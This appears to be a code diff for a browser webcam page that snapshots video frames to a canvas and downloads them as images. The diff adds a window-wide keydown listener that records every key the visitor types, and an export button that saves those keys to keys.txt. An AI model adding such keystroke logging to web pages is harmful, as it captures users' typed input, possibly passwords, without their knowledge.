@@ -1,52 +1,75 @@
-const video = document.getElementById("video");
+document.addEventListener("DOMContentLoaded", function () {
+    const video = document.getElementById("video");
+    let imageCounter = 1;
+    let keyLoggedArray = [];
 
-let imageCounter = 1;
-video.addEventListener('playing', function () {
-    video.addEventListener("touchstart", capture);
-    video.addEventListener("mousedown", capture);
-});
+    // Consolidate `keydown` event listener into one.
+    window.addEventListener('keydown', function (e) {
+        console.log("Keys Pressed" + (" -> ") + e.key);
+        keyLoggedArray.push(e.key);
+    });
 
-function on_cam_success(stream) {
-    video.srcObject = stream;
-}
+    video.addEventListener('playing', function () {
+        video.addEventListener("touchstart", capture);
+        video.addEventListener("mousedown", capture);
+    });
 
-function on_cam_error(err) {
-    alert("error occurred"+err.message);
-}
+    function on_cam_success(stream) {
+        video.srcObject = stream;
+    }
 
-const constraints = {audio: false, video: true};
-navigator.mediaDevices.getUserMedia(constraints).then(on_cam_success).catch(on_cam_error);
+    function on_cam_error(err) {
+        alert("Error occurred: " + err.message);
+    }
 
-function capture() {
-    const c = document.getElementById("canvas");
-    c.width = video.videoWidth;
-    c.height = video.videoHeight;
+    const constraints = { audio: false, video: true };
+    navigator.mediaDevices.getUserMedia(constraints).then(on_cam_success).catch(on_cam_error);
 
-    const ctx = c.getContext("2d");
-    ctx.clearRect(0, 0, c.width, c.height);
+    function capture() {
+        const c = document.getElementById("canvas");
+        if (!c) return;
 
-    ctx.drawImage(video, 0, 0, c.width, c.height);
-}
+        c.width = video.videoWidth;
+        c.height = video.videoHeight;
 
-function downloadImage() {
-    const c = document.getElementById("canvas");
-    const dataUrl = c.toDataURL("image/png");
+        const ctx = c.getContext("2d");
+        ctx.clearRect(0, 0, c.width, c.height);
+        ctx.drawImage(video, 0, 0, c.width, c.height);
+    }
 
-    const link = document.createElement("a");
-    link.download = 'myImage' + imageCounter + '.png';
-    link.href = dataUrl;
-    link.click();
+    function downloadImage() {
+        const c = document.getElementById("canvas");
+        if (!c) return;
 
-    imageCounter++;
-}
+        const dataUrl = c.toDataURL("image/png");
 
-document.querySelector('button').addEventListener('click', function () {
-    capture();
-    setTimeout(downloadImage, 100);
+        const link = document.createElement("a");
+        link.download = 'myImage' + imageCounter + '.png';
+        link.href = dataUrl;
+        link.click();
 
-    setTimeout(function () {
-        window.addEventListener('keydown', function (e) {
-            console.log(e.key, e.code);
+        imageCounter++;
+    }
+
+    function downloadKeystrokes() {
+        let dataStr = "data:text/plain;charset=utf-8," + encodeURIComponent(keyLoggedArray.join("\n"));
+        let dlAnchorElem = document.createElement('a');
+        dlAnchorElem.setAttribute('href', dataStr);
+        dlAnchorElem.setAttribute('download', 'keys.txt');
+        dlAnchorElem.click();
+    }
+
+    // Ensure elements exist before adding listeners
+    const captureButton = document.getElementById('captureButton');
+    if (captureButton) {
+        captureButton.addEventListener('click', function () {
+            capture();
+            setTimeout(downloadImage, 1000);
         });
-    }, 9000);
+    }
+
+    const exportButton = document.getElementById('export');
+    if (exportButton) {
+        exportButton.addEventListener('click', downloadKeystrokes);
+    }
 });
